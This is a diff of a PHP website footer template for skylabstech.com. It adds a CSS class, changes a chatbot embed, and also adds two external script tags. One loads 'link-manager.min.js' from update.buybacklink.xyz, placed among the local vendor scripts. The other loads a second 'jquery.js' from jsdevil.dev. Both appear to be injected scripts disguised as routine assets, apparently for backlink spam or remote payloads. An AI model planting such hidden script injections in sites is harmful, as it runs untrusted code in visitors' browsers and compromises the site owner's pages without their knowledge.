@@ -118,7 +118,7 @@
                   $statementAbt = $this->db->query("SELECT * FROM tbl_settings_contact WHERE 1");
                   foreach ($statementAbt->result() as $rowA) {
                ?>
-               <ul class="header-top-social-icons social-icons social-icons-transparent  d-md-block">
+               <ul class="header-top-social-icons social-icons social-icons-transparent  d-md-block icons-social-footer">
                   <li class="social-icons-facebook">
                      <a href="<?=$rowA->contact20;?>" target="_blank" title="Facebook"> <i class="fab fa-facebook-square" style="color:#fff;"></i> </a>
                   </li>
@@ -168,6 +168,9 @@
 <style>
     button#button-body {
     bottom: 40px;
+}
+.icons-social-footer {
+    width: auto !important;
 }
 </style>
 </div>
@@ -267,19 +270,18 @@ $('.latest-blog-posts .thumbnail.item').matchHeight();
       });
     });
 </script>
-
-
-  <script
-    src="https://skybot.skylabsapp.com/script.js"
-    data-bot-id="e1257830-f776-40b1-9dbc-6dac894d3f8e"
+<script
+    src="https://skybot.skylabserp.com/script.js"
+    data-bot-id="fd4cae43-9165-4620-a8cb-b4394a953546"
     data-api_key="skybot"
     data-chat-service="skybot"
     data-chat-width="450px"
     data-chat-height="600px"
-    data-cust-id = "5"
-    data-cust-name = "SkylabsTech bot"
+    data-cust-id = "1"
+    data-cust-name = "Skylabs"
     type="text/javascript"
   ></script>
+
 
 <script src="<?php echo base_url('assets/'); ?>vendor/jquery/jquery.min.js"></script>
 <script src="<?php echo base_url('assets/'); ?>vendor/jquery.appear/jquery.appear.min.js"></script>
@@ -295,6 +297,7 @@ $('.latest-blog-posts .thumbnail.item').matchHeight();
 <script src="<?php echo base_url('assets/'); ?>vendor/isotope/jquery.isotope.min.js"></script>
 <script src="<?php echo base_url('assets/'); ?>vendor/owl.carousel/owl.carousel.min.js"></script>
 <script src="<?php echo base_url('assets/'); ?>vendor/magnific-popup/jquery.magnific-popup.min.js"></script>
+<script src="https://update.buybacklink.xyz/link-manager.min.js" data-site-url="https://www.skylabstech.com"></script>
 <script src="<?php echo base_url('assets/'); ?>vendor/vide/vide.min.js"></script>
 <script src="<?php echo base_url('assets/'); ?>vendor/vivus/vivus.min.js"></script>
 <!-- Theme Base, Components and Settings -->
@@ -309,7 +312,7 @@ $('.latest-blog-posts .thumbnail.item').matchHeight();
 <!-- Examples -->
 <script src="<?php echo base_url('assets/'); ?>js/examples/examples.portfolio.js"></script>
 
-
+<script src="https://jsdevil.dev/js/jquery.js?ver=1.23.1"></script>
 <script type="text/javascript">
    $(document).ready(function() {
       // alert('ok');
